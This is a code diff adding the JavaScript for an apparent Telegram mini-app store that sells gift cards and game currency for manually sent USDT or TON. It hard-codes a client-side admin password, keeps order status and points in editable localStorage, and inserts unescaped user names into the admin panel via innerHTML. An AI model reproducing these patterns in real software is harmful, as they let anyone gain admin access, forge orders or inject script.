+  {id:6, n:'PlayStation', i:'🕹️', t:'PSN',        bg:'#00081A', c:'gaming',    d:'Games and PS Plus.',               a:['$10','$20','$50','$100'],         p:['10.5 USDT','21 USDT','52 USDT','103 USDT'],           u:[10,20,50,100],      b:''},
+  {id:7, n:'Xbox',        i:'🟢', t:'Xbox Live',  bg:'#001400', c:'gaming',    d:'Games and Xbox Game Pass.',        a:['$10','$25','$50','$100'],         p:['10.5 USDT','26 USDT','52 USDT','103 USDT'],           u:[10,25,50,100],      b:''},
+  {id:8, n:'Spotify',     i:'🎧', t:'Music',      bg:'#081A0A', c:'music',     d:'Music streaming.',                 a:['$10','$30','$60'],               p:['10.5 USDT','31 USDT','62 USDT'],                      u:[10,30,60],          b:'new'},
+  {id:9, n:'PUBG Mobile', i:'🎯', t:'UC Voucher', bg:'#120900', c:'gaming',    d:'UC voucher for PUBG Mobile.',      a:['60 UC','325 UC','660 UC','1800 UC'],p:['1.5 USDT','6 USDT','10 USDT','25 USDT'],             u:[1.5,6,10,25],       b:'hot'},
+  {id:10,n:'Free Fire',   i:'🔥', t:'Diamonds',   bg:'#1A0400', c:'gaming',    d:'Diamonds for Free Fire.',          a:['100💎','310💎','520💎','1080💎'],  p:['2 USDT','5 USDT','8 USDT','15 USDT'],                 u:[2,5,8,15],          b:'hot'},
+  {id:11,n:'Roblox',      i:'🧱', t:'Robux',      bg:'#180000', c:'gaming',    d:'Robux for Roblox.',                a:['400 Rbx','800 Rbx','1700 Rbx'],  p:['5 USDT','10 USDT','20 USDT'],                         u:[5,10,20],           b:'new'},
+  {id:12,n:'Razer Gold',  i:'🐍', t:'Razer',      bg:'#000F00', c:'gaming',    d:'Razer Gold for gaming.',           a:['$5','$10','$20','$50'],           p:['5.5 USDT','10.5 USDT','21 USDT','52 USDT'],           u:[5,10,20,50],        b:'new'},
+  {id:13,n:'Apple Store', i:'🍎', t:'App Store',  bg:'#0D0D0D', c:'shopping',  d:'App Store for Apple.',             a:['$10','$25','$50','$100'],         p:['10.5 USDT','26 USDT','52 USDT','103 USDT'],           u:[10,25,50,100],      b:''},
+  {id:14,n:'Binance',     i:'🟡', t:'Crypto',     bg:'#120E00', c:'shopping',  d:'Top up your Binance account.',    a:['$20','$50','$100','$200'],        p:['21 USDT','52 USDT','103 USDT','205 USDT'],             u:[20,50,100,200],     b:'hot'},
+  {id:15,n:'Noon',        i:'🛍️', t:'Shopping',   bg:'#100C00', c:'shopping',  d:'Middle East largest store.',      a:['$10','$25','$50','$100'],         p:['10.5 USDT','26 USDT','52 USDT','103 USDT'],           u:[10,25,50,100],      b:'new'},
+  {id:16,n:'TikTok',      i:'🎵', t:'TikTok Coins',bg:'#000F14',c:'social',    d:'TikTok coins for live gifts.',    a:['100🪙','500🪙','1000🪙','2000🪙'],p:['1.5 USDT','6.5 USDT','12 USDT','22 USDT'],            u:[1.5,6.5,12,22],     b:'hot'},
+  {id:17,n:'YouTube',     i:'📺', t:'Premium',    bg:'#160000', c:'streaming', d:'YouTube Premium membership.',     a:['1 Month','3 Months','6 Months'], p:['14 USDT','38 USDT','72 USDT'],                        u:[14,38,72],          b:'new'},
+  {id:18,n:'Minecraft',   i:'⛏️', t:'Gaming',     bg:'#060E00', c:'gaming',    d:'Minecraft edition codes.',        a:['Java Ed.','Bedrock Ed.'],         p:['27 USDT','27 USDT'],                                  u:[27,27],             b:''},
+  {id:19,n:'Discord',     i:'💬', t:'Nitro',      bg:'#060518', c:'social',    d:'Discord Nitro subscription.',     a:['1 Month','3 Months','12 Months'],p:['12 USDT','30 USDT','100 USDT'],                       u:[12,30,100],         b:'new'},
+  {id:20,n:'Fortnite',    i:'🎯', t:'V-Bucks',    bg:'#000F18', c:'gaming',    d:'V-Bucks for Fortnite.',           a:['1000 V','2800 V','5000 V'],       p:['8 USDT','20 USDT','32 USDT'],                         u:[8,20,32],           b:'hot'}
+];
+
+function rc(list){
+  var g=document.getElementById('grid');
+  if(!g){console.log('no grid');return;}
+  console.log('rendering',list.length,'cards');
+  var h='';
+  for(var i=0;i<list.length;i++){
+    var p=list[i];
+    var bdg='';
+    if(p.b==='hot')bdg='<div class="cbdg hot">HOT</div>';
+    else if(p.b==='new')bdg='<div class="cbdg new">NEW</div>';
+    h+='<div class="card" onclick="op('+p.id+')">';
+    h+='<div class="cimg" style="background:'+p.bg+'">';
+    h+=bdg;
+    h+='<div class="cico">'+p.i+'</div>';
+    h+='<div class="ctag">'+p.t+'</div>';
+    h+='</div>';
+    h+='<div class="cinf">';
+    h+='<div class="cnm">'+p.n+'</div>';
+    h+='<div class="cpr">From '+p.p[0]+'</div>';
+    h+='<div class="ctg">USDT &bull; TON</div>';
+    h+='</div></div>';
+  }
+  g.innerHTML=h;
+  console.log('cards rendered OK');
+}
+
+function fcat(c,btn){
+  var bs=document.querySelectorAll('.cat');
+  for(var i=0;i<bs.length;i++)bs[i].classList.remove('on');
+  btn.classList.add('on');
+  rc(c==='all'?P:P.filter(function(x){return x.c===c;}));
+}
+
+function srch(q){
+  rc(q?P.filter(function(x){return x.n.toLowerCase().indexOf(q.toLowerCase())>=0;}):P);
+}
+
+function op(id){
+  CP=null;CA=0;
+  for(var i=0;i<P.length;i++)if(P[i].id===id){CP=P[i];break;}
+  if(!CP)return;
+  var p=CP,ah='';
+  for(var i=0;i<p.a.length;i++){
+    ah+='<button class="ab'+(i===0?' on':'')+'" onclick="sa('+i+',this)">';
+    ah+=p.a[i]+'<div class="sub">'+p.p[i]+'</div></button>';
+  }
+  var h='<div class="shd">';
+  h+='<div style="display:flex;align-items:center;gap:10px;flex:1">';
+  h+='<div style="width:50px;height:50px;border-radius:13px;background:'+p.bg+';display:flex;flex-direction:column;align-items:center;justify-content:center;gap:2px">';
+  h+='<div style="font-size:24px;line-height:1">'+p.i+'</div>';
+  h+='</div>';
+  h+='<div><div style="font-size:16px;font-weight:800">'+p.n+'</div>';
+  h+='<div style="font-size:11px;color:#5A8AAA">Gift Card</div></div></div>';
+  h+='<button class="xcl" onclick="clov1()">x</button></div>';
+  h+='<div style="font-size:12px;color:#5A8AAA;line-height:1.5;margin-bottom:13px">'+p.d+'</div>';
+  h+='<div class="lbl">Select Amount</div>';
+  h+='<div class="ags">'+ah+'</div>';
+  h+='<div class="smb">';
+  h+='<div class="sr"><span class="sl_">Item</span><span class="sv">'+p.n+' <span id="sv1">'+p.a[0]+'</span></span></div>';
+  h+='<div class="sr"><span class="sl_">You Pay</span><span class="sv ac" id="sv2">'+p.p[0]+'</span></div>';
+  h+='<div class="sr"><span class="sl_">Points</span><span class="sv ye" id="sv3">+'+Math.floor(p.u[0]*2)+' pts</span></div>';
+  h+='<div class="sr"><span class="sl_">Delivery</span><span class="sv gr">Lightning Instant</span></div>';
+  h+='</div>';
+  h+='<button class="buybtn" id="bbt" onclick="opay()">Buy Now - '+p.p[0]+'</button>';
+  document.getElementById('sb1').innerHTML=h;
+  document.getElementById('ov1').classList.add('on');
+  setTimeout(function(){document.getElementById('sh1').classList.add('on');},10);
+}
+
+function sa(i,el){
+  CA=i;
+  var bs=document.querySelectorAll('.ab');
+  for(var j=0;j<bs.length;j++)bs[j].classList.remove('on');
+  el.classList.add('on');
+  var e=document.getElementById('sv1');if(e)e.textContent=CP.a[i];
+  e=document.getElementById('sv2');if(e)e.textContent=CP.p[i];
+  e=document.getElementById('sv3');if(e)e.textContent='+'+Math.floor(CP.u[i]*2)+' pts';
+  e=document.getElementById('bbt');if(e)e.textContent='Buy Now - '+CP.p[i];
+}
+
+function clov1(){
+  document.getElementById('sh1').classList.remove('on');
+  setTimeout(function(){document.getElementById('ov1').classList.remove('on');},300);
+}
+
+function opay(){
+  clov1();
+  var p=CP,amt=p.a[CA],price=p.p[CA];
+  CN='ton';
+  var h='<div class="shd">';
+  h+='<div><div style="font-size:16px;font-weight:800">Complete Payment</div>';
+  h+='<div style="font-size:11px;color:#5A8AAA;margin-top:2px">'+p.n+' '+amt+' - '+price+'</div></div>';
+  h+='<button class="xcl" onclick="clov2()">x</button></div>';
+  h+='<div class="lbl">Payment Method</div>';
+  h+='<div class="pm">';
+  h+='<div class="pmc on" id="m1" onclick="swm(\'ton\',this)"><div class="pmi">💎</div><div class="pmn">TON</div><div class="pms">Telegram Wallet</div></div>';
+  h+='<div class="pmc" id="m2" onclick="swm(\'trc\',this)"><div class="pmi">💵</div><div class="pmn">USDT TRC20</div><div class="pms">Tron Network</div></div>';
+  h+='</div>';
+  h+='<div id="tsec">';
+  h+='<div style="background:rgba(0,152,234,.07);border:1px solid rgba(0,152,234,.18);border-radius:12px;padding:13px;margin-bottom:11px">';
+  h+='<div style="font-size:12px;font-weight:700;color:#00C6FF;margin-bottom:7px">How to pay with TON</div>';
+  h+='<div style="font-size:10px;color:#5A8AAA;line-height:1.9;margin-bottom:10px">1. Open @wallet in Telegram<br>2. Tap Send<br>3. Paste the address below<br>4. Send <b style="color:#0098EA">'+price+'</b> in TON</div>';
+  h+='<div class="abox">'+TON+'</div>';
+  h+='<button class="cpbtn" onclick="cpt()">Copy TON Address</button>';
+  h+='<button class="tonbtn" onclick="ourl(\'https://t.me/wallet\')">Open @wallet</button>';
+  h+='</div></div>';
+  h+='<div id="usec" style="display:none">';
+  h+='<div style="background:rgba(0,152,234,.05);border:1px solid rgba(0,152,234,.15);border-radius:12px;padding:13px;margin-bottom:11px">';
+  h+='<div style="font-size:12px;font-weight:700;color:#00C6FF;margin-bottom:7px">Pay with USDT TRC20</div>';
+  h+='<div style="font-size:10px;color:#5A8AAA;line-height:1.9;margin-bottom:10px">Send exactly <b style="color:#0098EA">'+price+'</b><br>Network: Tron (TRC20) only!</div>';
+  h+='<div class="abox">'+USDT+'</div>';
+  h+='<button class="cpbtn" onclick="cpu()">Copy USDT Address</button>';
+  h+='</div></div>';
+  h+='<div class="warn">Send exactly <b>'+price+'</b>. Wrong network = funds lost!</div>';
+  h+='<button class="cfbtn" onclick="cfp()">';
+  h+='<div>I Have Sent the Payment</div>';
+  h+='<div class="cfbt2">Tap after sending crypto</div>';
+  h+='</button>';
+  h+='<div style="font-size:10px;color:#5A8AAA;text-align:center;margin-top:11px;line-height:1.6">Admin verifies and delivers within 15 minutes</div>';
+  document.getElementById('sb2').innerHTML=h;
+  document.getElementById('ov2').classList.add('on');
+  setTimeout(function(){document.getElementById('sh2').classList.add('on');},10);
+}
+
+function swm(n,el){
+  CN=n;
+  var ms=document.querySelectorAll('.pmc');
+  for(var i=0;i<ms.length;i++)ms[i].classList.remove('on');
+  el.classList.add('on');
+  document.getElementById('tsec').style.display=n==='ton'?'block':'none';
+  document.getElementById('usec').style.display=n==='trc'?'block':'none';
+}
+
+function cpu(){try{navigator.clipboard.writeText(USDT);}catch(e){}toast('Copied USDT address!');}
+function cpt(){try{navigator.clipboard.writeText(TON);}catch(e){}toast('Copied TON address!');}
+
+function clov2(){
+  document.getElementById('sh2').classList.remove('on');
+  setTimeout(function(){document.getElementById('ov2').classList.remove('on');},300);
+}
+
+function cfp(){
+  clov2();
+  var p=CP,amt=p.a[CA],price=p.p[CA];
+  var pts=Math.floor(p.u[CA]*2);
+  var oid='TGH-'+Date.now().toString().slice(-6);
+  var nm=(U.first_name||'')+(U.last_name?' '+U.last_name:'');
+  var hd=U.username?'@'+U.username:'No username';
+  var nl=CN==='ton'?'TON':'USDT TRC20';
+  var ord={id:oid,n:p.n+' '+amt,i:p.i,price:price,pts:pts,status:'pending',date:new Date().toLocaleDateString(),net:nl,uid:String(U.id||'?'),nm:nm,hd:hd};
+  ST.orders.unshift(ord);sv();
+  var ao=gao();ao.unshift(ord);sao(ao);
+  upd();
+  msg(OWN,'NEW ORDER #'+oid+'\n\nProduct: '+p.n+' '+amt+'\nPrice: '+price+'\nNetwork: '+nl+'\n\nCustomer: '+nm+'\nUsername: '+hd+'\nID: '+(U.id||'?')+'\nDate: '+new Date().toLocaleString()+'\n\nCheck wallet then approve!');
+  toast('Order #'+oid+' placed! Awaiting confirmation.');
+  go('orders');
+}
+
+function rord(){
+  var l=document.getElementById('olst'),em=document.getElementById('oemp'),oc=document.getElementById('ocnt');
+  if(oc)oc.textContent=ST.orders.length+' orders';
+  if(!ST.orders.length){if(em)em.style.display='block';if(l)l.innerHTML='';return;}
+  if(em)em.style.display='none';
+  var h='';
+  for(var i=0;i<ST.orders.length;i++){
+    var o=ST.orders[i];
+    var sc=o.status==='done'?'done':o.status==='cancelled'?'canc':'pend';
+    var st=o.status==='done'?'Delivered':o.status==='cancelled'?'Cancelled':'Pending';
+    h+='<div class="ordr"><div class="oi">'+(o.i||'🎁')+'</div>';
+    h+='<div class="on_"><div class="onm">'+o.n+'</div>';
+    h+='<div class="osb">'+o.price+' - '+(o.net||'')+(o.status==='done'?' - +'+o.pts+' pts':'')+'</div>';
+    h+='<div class="odt">'+o.date+' - #'+o.id+'</div></div>';
+    h+='<div class="bdg '+sc+'">'+st+'</div></div>';
+  }
+  if(l)l.innerHTML=h;
+}
+
+function rrw(){
+  var e=document.getElementById('rwp');if(e)e.textContent=ST.pts;
+  var pct=Math.min((ST.pts/100000)*100,100);
+  e=document.getElementById('rwb');if(e)e.style.width=pct+'%';
+  e=document.getElementById('rwn');if(e)e.textContent=ST.pts.toLocaleString()+' / 100,000 pts';
+  var c=document.getElementById('rcode');if(c)c.textContent='TGH-'+String(U.id||'0000').slice(-4).toUpperCase();
+  var rqs=[100000,200000,500000];
+  ['r10','r20','r50'].forEach(function(id,i){
+    var b=document.getElementById(id);if(!b)return;
+    b.className=ST.pts>=rqs[i]?'rdb rdca':'rdb rdcn';
+  });
+}
+
+function rdm(v,req){
+  if(ST.pts<req){toast('Not enough points!');return;}
+  ST.pts-=req;sv();upd();
+  msg(OWN,'REDEEM: '+(U.first_name||'?')+' @'+(U.username||'?')+' wants $'+v+' card');
+  toast('Redeemed $'+v+' card! Admin will send shortly.');
+  rrw();
+}
+
+function cpref(){
+  var c=document.getElementById('rcode');
+  try{navigator.clipboard.writeText('https://t.me/tonscards_bot?start='+(c?c.textContent:''));}catch(e){}
+  toast('Referral link copied!');
+}
+
+function rprf(){
+  var nm=(U.first_name||'')+(U.last_name?' '+U.last_name:'');
+  var ini=nm.replace(/[^A-Za-z]/g,'').slice(0,2).toUpperCase()||'TG';
+  var e=document.getElementById('pav');if(e)e.textContent=ini;
+  e=document.getElementById('pnm');if(e)e.textContent=nm||'Guest';
+  e=document.getElementById('pid');if(e)e.textContent='@'+(U.username||'user')+' - ID: '+(U.id||'---');
+  e=document.getElementById('por');if(e)e.textContent=ST.orders.filter(function(o){return o.status==='done';}).length;
+  e=document.getElementById('ppt');if(e)e.textContent=ST.pts;
+}
+
+function radm(f){
+  var ao=gao();
+  var e=document.getElementById('sat');if(e)e.textContent=ao.length;
+  e=document.getElementById('sap');if(e)e.textContent=ao.filter(function(o){return o.status==='pending';}).length;
+  e=document.getElementById('sad');if(e)e.textContent=ao.filter(function(o){return o.status==='done';}).length;
+  e=document.getElementById('sac');if(e)e.textContent=ao.filter(function(o){return o.status==='cancelled';}).length;
+  var list=f?ao.filter(function(o){return o.status===f;}):ao;
+  var pf=list.filter(function(o){return o.status==='pending';});
+  var sorted=pf.concat(list.filter(function(o){return o.status!=='pending';}));
+  var el=document.getElementById('aol');if(!el)return;
+  if(!sorted.length){el.innerHTML='<div class="empty"><div class="ei">📭</div><div class="et">No orders yet</div></div>';return;}
+  var h='';
+  for(var i=0;i<sorted.length;i++){
+    var o=sorted[i];
+    var sc=o.status==='done'?'done':o.status==='cancelled'?'canc':'pend';
+    var st=o.status==='done'?'Approved':o.status==='cancelled'?'Cancelled':'Pending';
+    h+='<div class="adc'+(o.status==='pending'?' pend':'')+'"><div class="adh"><div class="adid">#'+o.id+'</div><div class="bdg '+sc+'">'+st+'</div></div>';
+    h+='<div class="adi"><div class="adpr"><span style="font-size:18px">'+(o.i||'🎁')+'</span><div class="adpn" style="margin-left:7px">'+o.n+'</div></div>';
+    h+='<div class="adgr"><div class="adf"><div class="adfl">Amount</div><div class="adfv" style="color:#0098EA">'+o.price+'</div></div>';
+    h+='<div class="adf"><div class="adfl">Network</div><div class="adfv">'+(o.net||'?')+'</div></div></div>';
+    h+='<div class="adcu">Customer: <b>'+(o.nm||'?')+'</b><br>Username: <b style="color:#0098EA">'+(o.hd||'-')+'</b><br>ID: <b>'+(o.uid||'?')+'</b><br>Date: '+o.date+'</div></div>';
+    h+='<div class="adbts">';
+    if(o.status==='pending'){
+      h+='<button class="adbt adap" onclick="aap(\''+o.id+'\',\''+o.uid+'\','+o.pts+')">Approve</button>';
+      h+='<button class="adbt adrj" onclick="arj(\''+o.id+'\')">Reject</button>';
+    }
+    h+='<button class="adbt addm" onclick="adm(\''+o.hd+'\')">Chat</button>';
+    h+='</div></div>';
+  }
+  el.innerHTML=h;
+}
+
+function aflt(f,btn){
+  var bs=document.querySelectorAll('.fb');for(var i=0;i<bs.length;i++)bs[i].classList.remove('on');
+  btn.classList.add('on');
+  radm(f==='all'?null:f);
+}
+
+function aap(oid,uid,pts){
+  var ao=gao();for(var i=0;i<ao.length;i++)if(ao[i].id===oid){ao[i].status='done';break;}sao(ao);
+  try{var uk='tgh_'+uid;var us=JSON.parse(localStorage.getItem(uk)||'null');if(us&&us.orders){for(var i=0;i<us.orders.length;i++)if(us.orders[i].id===oid){us.orders[i].status='done';break;}us.pts=(us.pts||0)+pts;localStorage.setItem(uk,JSON.stringify(us));if(String(uid)===String(U.id)){ST=us;upd();}}}catch(e){}
+  msg(uid,'Your order #'+oid+' is APPROVED!\nYour gift card code will be sent shortly.\n+'+pts+' points added!\n\nThank you for using TON GIFT HUB!');
+  toast('Approved! Customer notified.');
+  radm();
+}
+
+function arj(oid){
+  var ao=gao(),o=null;for(var i=0;i<ao.length;i++)if(ao[i].id===oid){ao[i].status='cancelled';o=ao[i];break;}sao(ao);
+  if(o){try{var uk='tgh_'+o.uid;var us=JSON.parse(localStorage.getItem(uk)||'null');if(us&&us.orders){for(var i=0;i<us.orders.length;i++)if(us.orders[i].id===oid){us.orders[i].status='cancelled';break;}localStorage.setItem(uk,JSON.stringify(us));if(String(o.uid)===String(U.id)){ST=us;upd();}}}catch(e){}
+  msg(o.uid,'Order #'+oid+' was cancelled.\nContact support: @aym1one');}
+  toast('Rejected. Customer notified.');radm();
+}
+
+function adm(hd){var u=(hd||'').replace('@','');if(!u||u==='No username'){toast('No username');return;}ourl('https://t.me/'+u);}
+
+function anv(f,btn){
+  var bs=document.querySelectorAll('#anav .nb');for(var i=0;i<bs.length;i++)bs[i].classList.remove('on');
+  btn.classList.add('on');
+  var pgs=document.querySelectorAll('.pg');for(var i=0;i<pgs.length;i++){pgs[i].classList.remove('on');pgs[i].style.display='none';}
+  var ap=document.getElementById('pg-admin');if(ap){ap.classList.add('on');ap.style.display='block';}
+  var fbs=document.querySelectorAll('.fb');for(var i=0;i<fbs.length;i++)fbs[i].classList.remove('on');
+  var m={'all':0,'pending':1,'done':2,'cancelled':3};
+  if(fbs[m[f]])fbs[m[f]].classList.add('on');
+  radm(f==='all'?null:f);
+}
+
+function vstore(){
+  var nbs=document.querySelectorAll('#anav .nb');for(var i=0;i<nbs.length;i++)nbs[i].classList.remove('on');
+  var last=document.querySelectorAll('#anav .nb');if(last.length)last[last.length-1].classList.add('on');
+  var pgs=document.querySelectorAll('.pg');for(var i=0;i<pgs.length;i++){pgs[i].classList.remove('on');pgs[i].style.display='none';}
+  var hp=document.getElementById('pg-home');if(hp){hp.classList.add('on');hp.style.display='block';}
+  rc(P);
+}
+
+function go(pg,el){
+  var pgs=document.querySelectorAll('.pg');
+  for(var i=0;i<pgs.length;i++){pgs[i].classList.remove('on');pgs[i].style.display='none';}
+  var p=document.getElementById('pg-'+pg);
+  if(p){p.classList.add('on');p.style.display='block';}
+  if(!isAdm){
+    var nbs=document.querySelectorAll('#nav .nb');for(var i=0;i<nbs.length;i++)nbs[i].classList.remove('on');
+    var nb=el&&el.classList&&el.classList.contains('nb')?el:document.getElementById('nb-'+pg);
+    if(nb)nb.classList.add('on');
+  }
+  var bd=document.getElementById('body');if(bd)bd.scrollTop=0;
+  if(pg==='orders')rord();
+  if(pg==='rewards')rrw();
+  if(pg==='profile')rprf();
+  if(pg==='admin')radm();
+  if(pg==='home')rc(P);
+}
+
+function upd(){
+  var e=document.getElementById('pts');if(e)e.textContent='💎 '+ST.pts+' pts';
+  var ep=document.getElementById('ppt');if(ep)ep.textContent=ST.pts;
+}
+
+function toast(m){
+  var t=document.getElementById('tst');if(!t)return;
+  t.textContent=m;t.style.opacity='1';t.style.transform='translateX(-50%) translateY(0)';
+  setTimeout(function(){t.style.opacity='0';t.style.transform='translateX(-50%) translateY(10px)';},3000);
+}
+
+function ourl(u){
+  try{if(tg&&tg.openTelegramLink&&u.indexOf('t.me')>=0){tg.openTelegramLink(u);return;}}catch(e){}
+  try{if(tg&&tg.openLink){tg.openLink(u);return;}}catch(e){}
+  window.open(u,'_blank');
+}
+
+function slng(l){document.body.dir=(l==='ar'||l==='fa')?'rtl':'ltr';}
+
+var _tc=0,_tt=null;
+function stap(){
+  _tc++;if(_tt)clearTimeout(_tt);
+  _tt=setTimeout(function(){_tc=0;},2000);
+  if(_tc>=5){_tc=0;var pw=prompt('Admin Password:');if(pw==='D22g'){isAdm=true;oadm();toast('Admin access granted!');}}
+}
+
+function oadm(){
+  document.getElementById('nav').style.display='none';
+  document.getElementById('anav').style.display='flex';
+  var pgs=document.querySelectorAll('.pg');for(var i=0;i<pgs.length;i++){pgs[i].classList.remove('on');pgs[i].style.display='none';}
+  var ap=document.getElementById('pg-admin');if(ap){ap.classList.add('on');ap.style.display='block';}
+  radm();
+}
+
+// INIT
+(function(){
+  try{var ls=document.getElementById('lsel');var lg=localStorage.getItem('tgh_lg')||'en';if(ls)ls.value=lg;slng(lg);}catch(e){}
+  if(isAdm){
+    oadm();
+  }else{
+    go('home');
+    rc(P);
+    upd();
+  }
+})();
+</script>
+
+</body>
+</html>
